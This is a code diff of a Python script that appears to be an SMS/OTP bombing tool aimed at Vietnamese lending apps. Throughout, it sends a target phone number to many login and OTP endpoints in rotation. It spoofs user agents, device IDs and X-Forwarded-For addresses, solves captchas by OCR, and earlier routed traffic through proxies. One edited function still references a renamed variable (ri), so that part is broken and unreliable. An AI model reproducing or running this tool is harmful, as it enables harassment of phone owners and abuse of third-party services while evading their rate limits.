@@ -28,6 +28,69 @@ import ddddocr
 ImageFile.LOAD_TRUNCATED_IMAGES = True
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
+class HeaderBuilder:
+    def __init__(self, call_origin: str):
+        self.origin = call_origin.rstrip("/")
+
+        self.ios_versions = ["14.0", "14.4", "15.0", "15.5", "16.0", "16.4", "17.0"]
+        self.android_versions = ["11", "12", "13", "14", "15"]
+
+        self.devices = [
+            "SM-G998B", "SM-F926B", "SM-S901B", "SM-A536E", "SM-M526B",
+            "Xiaomi 13 Pro", "Xiaomi 14 Ultra", "Redmi Note 13 Pro", "Redmi K70", "POCO X6 Pro",
+            "Nubia Neo 5G", "Nubia Z60 Ultra", "Nubia Red Magic 9 Pro",
+            "OPPO Find X7 Ultra", "OPPO Reno 11 Pro", "OPPO A78",
+            "vivo X100 Pro", "iQOO 12 Pro", "iQOO Neo 9 Pro",
+            "iPhone15,2", "iPhone15,3", "iPhone16,1", "iPhone16,2",
+            "Pixel 8 Pro", "Pixel 7a", "M2012K11AG", "V2134", "CPH2211"
+        ]
+
+    def _random_ios_ua(self):
+        ios_ver = random.choice(self.ios_versions)
+        webkit = random.randint(600, 605)
+        safari_ver = random.randint(14, 17)
+
+        return (
+            f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_ver.replace('.', '_')} like Mac OS X) "
+            f"AppleWebKit/{webkit}.1 (KHTML, like Gecko) Version/{safari_ver}.0 "
+            f"Mobile/15E148 Safari/{webkit}.1"
+        )
+
+    def _random_android_ua(self):
+        device = random.choice(self.devices)
+        return f"Dalvik/2.1.0 (Linux; U; Android {random.choice(self.android_versions)}; {device})"
+
+    def _random_x_forwarded_for(self):
+        return ".".join(str(random.randint(1, 255)) for _ in range(4))
+
+    def build(self, mode: str = "mix"):
+        if mode == "ios":
+            ua = self._random_ios_ua()
+        elif mode == "android":
+            ua = self._random_android_ua()
+        else:
+            ua = random.choice([self._random_ios_ua(), self._random_android_ua()])
+
+        return {
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Content-Type": "application/json",
+            "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not-A.Brand";v="99"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": '"Android"',
+            "Sec-Fetch-Site": "same-site",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "User-Agent": ua,
+            "Origin": self.origin,
+            "Referer": self.origin + "/",
+            "X-Device-Id": str(uuid.uuid4()),
+            "X-Device-ID-Alt": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
+            "X-Forwarded-For": self._random_x_forwarded_for(),
+            "Connection": "keep-alive",
+        }
+
 def _random_android_id() -> str:
     return ''.join(random.choices('0123456789abcdef', k=32))
 
@@ -70,37 +133,6 @@ def get_random_ipv6():
         part = format(random.randint(0, 65535), 'x')
         parts.append(part)
     return ':'.join(parts)
-
-def random_ios():
-    los = ["14.0", "14.4", "15.0", "15.5", "16.0", "16.4", "17.0"]
-    web = random.randint(600, 605)
-    sf  = random.randint(14, 17)
-    nok = random.choice(los)
-    return (
-        f"Mozilla/5.0 (iPhone; CPU iPhone OS {nok.replace('.','_')} like Mac OS X) "
-        f"AppleWebKit/{web}.1 (KHTML, like Gecko) Version/{sf}.0 Mobile/15E148 Safari/{web}.1"
-    )
-
-def build_headers(call_origin: str):
-    origin = call_origin.rstrip("/")
-    return {
-        "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
-        "Accept-Encoding": "gzip, deflate, br, zstd",
-        "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not-A.Brand";v="99"',
-        "sec-ch-ua-mobile": "?1",
-        "sec-ch-ua-platform": '"Android"',
-        "Sec-Fetch-Site": "same-site",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Dest": "empty",
-        "x-client-type": "phone",
-        "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
-        "Origin": origin,
-        "Referer": origin + "/",
-        "Content-Type": "application/json",
-        "Connection": "keep-alive",
-        "X-Device-Id": str(uuid.uuid4()),
-    }
 
 
 _VNCREDIT_KEY = b'tdbdif7653scbvy4'
@@ -546,28 +578,33 @@ async def call_mfast360(phone_otp):
         pass
 
 async def calll20(phone_otp):
-    headers = build_headers("https://vn-ios-h5-artemisdongapp-com.pages.dev")
+    hb = HeaderBuilder("https://vn-ios-h5-artemisdongapp-com.pages.dev")
+
     payload = {
-       "country_code": "vn",
-       "phone": phone_otp,
-       "app_name": "Artemis Dong",
-       "app_package_name": "com.artmis.dong.vn",
-       "platform": "ios",
-       "app_id": "264000001",
+        "country_code": "vn",
+        "phone": phone_otp,
+        "app_name": "Artemis Dong",
+        "app_package_name": "com.artmis.dong.vn",
+        "platform": "ios",
+        "app_id": "264000001",
     }
+
     async with httpx.AsyncClient(timeout=10) as client:
+        headers = hb.build()
+
         res1 = await client.post(
             "https://advii.artemisdongapp.com/v2/login/captcha",
             json={**payload, "type": 1},
             headers=headers
-            )
+        )
 
         res2 = await client.post(
-                "https://advii.artemisdongapp.com/v2/login/captcha",
-                json={**payload, "type": 2},
-                headers=headers
+            "https://advii.artemisdongapp.com/v2/login/captcha",
+            json={**payload, "type": 2},
+            headers=headers
+        )
 
-               )
+    return res1, res2
 
 async def call2(phone_otp):
     try:
@@ -820,7 +857,6 @@ VAY_DEP365 = [
         "https://wander6fb5.xadoa8.workers.dev/vaydep365",
         "https://verceldeploy-one-phi.vercel.app/api/vaydep",        
     ]
-
 async def call_vaydep365(phone_otp: str):    
     try:    
         async with httpx.AsyncClient(timeout=10) as client:    
@@ -833,7 +869,6 @@ async def call_vaydep365(phone_otp: str):
         return r.json()
     except Exception as e:
         return None
-
 
 async def call8(phone_otp):
     headers = build_headers("https://ios-h5.marttimeassrt.com")
@@ -951,10 +986,9 @@ async def calll(phone_otp):
             headers=headers,
         )
 
-async def call_senvay(phone_otp, proxy_url):
+async def call_senvay(phone_otp):
     KEY   = b"43frgy5fmjf4647f"
     NONCE = b"\x00" * 12
-
     def enc(plain):
         if isinstance(plain, (dict, list)):
             plain = json.dumps(plain, separators=(",", ":")).encode()
@@ -982,15 +1016,9 @@ async def call_senvay(phone_otp, proxy_url):
         }
 
     device_no = str(uuid.uuid4())
-    proxies   = {"https": proxy_url, "http": proxy_url} if isinstance(proxy_url, str) else proxy_url
     base_url  = "https://senvayvaytien.com/ly03"
-
     try:
-        async with BrowserSession(impersonate=_BROWSER, proxies=proxies, verify=False, timeout=30) as client:
-
-            # ── Bước 1: Sync thời gian với server qua initData ──────────────
-            # JS: ServiceTime = Date.now() - server.ffolml
-            # Sau đó token_time = Date.now() - ServiceTime = server.ffolml
+        async with httpx.AsyncClient(verify=False, timeout=30) as client:
             init_path  = "/encrypt/k/bla/j"
             init_param = {
                 "fndkec": "vn",
@@ -1003,27 +1031,22 @@ async def call_senvay(phone_otp, proxy_url):
             local_before  = int(time.time() * 1000)
             init_token    = make_token(device_no, local_before)
             init_body     = enc({"param": enc(init_param), "url": enc(init_path)})
-            ri = await client.post(
+            r = await client.post(
                 f"{base_url}{init_path}",
                 content=init_body.encode(),
                 headers=make_headers(init_token),
             )
             server_time_ms = local_before  # fallback: dùng local time nếu sync thất bại
-            if ri.status_code == 200:
+            if r.status_code == 200:
                 try:
                     init_data = ri.json()
                     result    = init_data.get("result") or {}
-                    # ffolml là server timestamp (ms) từ response
                     sv = result.get("ffolml")
                     if sv and isinstance(sv, (int, float)) and sv > 1_000_000_000_000:
                         server_time_ms = int(sv)
                 except Exception:
                     pass
-
-            # ── Bước 2: Gửi SMS OTP dùng server_time trong token ─────────────
             sms_path  = "/fm/nkgg/edf"
-            # Chuẩn hoá phone: bỏ số 0 đầu nếu có → thêm 840
-            # VD: "0971234567" → "840971234567" (không phải "8400971234567")
             phone_fmt = "840" + phone_otp.lstrip("0")
             sms_param = {
                 "ffchmk": "vn",
@@ -1034,7 +1057,6 @@ async def call_senvay(phone_otp, proxy_url):
                 "fojphg": 1,
             }
             sms_token = make_token(device_no, server_time_ms)
-            # param trước url (theo thứ tự native app gửi)
             sms_body  = enc({"param": enc(sms_param), "url": enc(sms_path)})
             r = await client.post(
                 f"{base_url}{sms_path}",
@@ -1042,16 +1064,11 @@ async def call_senvay(phone_otp, proxy_url):
                 headers=make_headers(sms_token),
             )
 
-        if r.status_code != 200:
-            return False, proxy_url, f"HTTP {r.status_code}"
-        data = r.json()
-        rc   = data.get("returnCode")
-        if rc == 200:
-            return True, proxy_url, "OK"
-        return False, proxy_url, f"returnCode {rc}: {data.get('returnMsg', '')}"
-
+        print(f"📡 Status: {r.status_code} | {r.text[:160]}")
+        return r.status_code == 200
     except Exception as e:
-        return False, proxy_url, f"Failed: {e}"
+        print(f"❌  error: {e}")
+        return False
 
 async def call10(phone_otp):
     headers = {
@@ -1690,11 +1707,11 @@ async def main():
         # (proxy(vuiapp),    proxy_sleep),        
         # (calll20,          10),
         # (mfast,            0),
-          (call101,          0),
+        # (call101,          0),
         # (call3,            0),
         # (call10ok,         10),
         # (ptvay_sms,        10),        
-        # (proxy(call_senvay), proxy_sleep),        
+         (call_senvay,        0),        
         # (call,             0),
         # (vncredit_voice,   10),        
         # (combo2,           10),        
@@ -1703,7 +1720,7 @@ async def main():
         # (call1,            10),
         # (combo1,           10), 
         # (call14ok,         10),
-        (achau_sms,        10),
+        # (achau_sms,        10),
         # (calll11ok,        10),
         # (petro_sms,        10),        
         # (call_mydong,      10),
